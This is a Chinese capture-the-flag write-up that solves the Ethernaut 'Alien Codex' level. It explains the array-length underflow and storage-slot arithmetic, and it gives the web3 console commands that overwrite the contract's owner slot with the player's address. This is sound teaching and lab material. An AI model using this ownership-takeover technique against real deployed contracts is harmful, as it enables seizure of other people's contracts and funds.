# Alien Codex
### 原题
你打开了一个 Alien 合约. 申明所有权来完成这一关.
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "../helpers/Ownable-05.sol";

contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint256 i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}
```
### 分析
我们可以看到继承了Ownable这个合约，\
我在github的仓库中找到`Ownable-05.sol`，\
`address private _owner;`存储定义在slot0。\
`contacted`修饰符可以通过调用`makeContact()`来使得校验通过。\
剩下能够操作的都是与动态数组相关。\
其实合约中整个状态变量如以下：
```solidity
  address private _owner;  // 20字节
  bool public contact;     // 1字节
  bytes32[] public codex;  // 32字节
```
根据变量的长度，我们就知道，_owner和contact会被压缩在slot0中。\
slot1存动态数组codex的长度。\
我先在命令行中看看这些值的情况。
```javascript
await web3.eth.getStorageAt(instance,0);
// '0x0000000000000000000000000bc04aa6aac163a6b3667636d798fa053d43bd11'
await web3.eth.getStorageAt(instance,1);
// '0x0000000000000000000000000000000000000000000000000000000000000000'
// 我们执行先makeContact
await contract.makeContact();
// 我们再看slot0的值
await web3.eth.getStorageAt(instance,0);
// '0x0000000000000000000000010bc04aa6aac163a6b3667636d798fa053d43bd11'
// 改变length值
await contract.retract();
await web3.eth.getStorageAt(instance,1)
// `solidity ^0.5.0,所以可以下溢出，此时 length 变为最大值了
// '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'

```
我们要想办法更改slot0存储的值，改成我们自己的地址来宣示所有权。\
我们可以看到`retract()`中,可以任意修改codex.length值。\
将codex.length改到uint256的最大值，\
怎么操作？\
就是利用数据下溢出漏洞，调用`retract()  执行length--`，\
为什么首先要这么做？
当我们要利用溢出的时候，就可以看到。\
先卖个关子，继续往下看就知道。\
我们假设（幻想）下，\
根据动态数组的存储机制，`p = keccak256(bytes32(存储数组长度的slot编号))`。\
数组元素 `index = p + offset`。\
如果我可以使用`revise(uint256 i, bytes32 _content)`, \
将我的地址作为参数，找个一个i，可以正好通过计算拿到slot0，那不是就可以破解了。\
因为这个合约中可以涉及到存储的就只有`record(bytes32 _content)`和`revise(uint256 i, bytes32 _content)`。\
`record(bytes32 _content)`是push操作，这个无法选择指定存储位置。\
如果是要让`index == 0`, 那么我们还是利用溢出的漏洞去正好让index等于0。
```javascript
/**
 * 在ethernaut.openzeppelin.com的过关页面，打开console
 * 使用`help()`可以查询到许多有用的内嵌对象
 * player -当前玩家的钱包账号地址
 * contract -当前过关合约实例
 * instance -当前过关合约实例的地址
 */
// 1. 我们执行先makeContact
await contract.makeContact();
// 2. 计算出p值
let p = BigInt(web3.utils.soliditySha3(1))
// 80084422859880547211683076133703299733277748156566366325829078699459944778998n

// 3. 计算offset
let max = 1n << 256n;
let offset = (max - p) % max;
// 35707666377435648211887908874984608119992236509074197713628505308453184860938n
// 看到没有，offset值很大，因为我们要循环计算，达到溢出
// 如果不首先把length设置到最大，EVM的边界检查就可能无法通过，i < length
// 这个就回答了上面的`为什么要将codex.length改到uint256的最大值`

// 4. 利用revise函数来修改slot0的
// player是自己的地址，用来宣示所有权
// 因为address是20字节的，所以我们还要将player扩展到32字节大小
let playerBytes32 = '0x' + player.replace(/^0x/, '').padStart(64, '0');
await contract.revise(offset, playerBytes32)

// 交易成功
// 打印slot0的值
await web3.eth.getStorageAt(instance, 0);
// 0x0000000000000000000000005c7c4ce6eb0d638af91c2726bfea5f6a8abb0a61
// 如果再执行一遍await contract.revise(offset, playerBytes32)，会发生什么？可以想想。
```
### 总结
一般破解观察主要几点：
1. 看编译器版本，低版本的安全性低，数学运算可以产生数据溢出情况,高版本的如果使用了`unchecked{}`要特别注意
2. 看修饰符
3. 看能够修改值的函数
4. 如果是涉及转账，看receive和callback，或者有标记payable的函数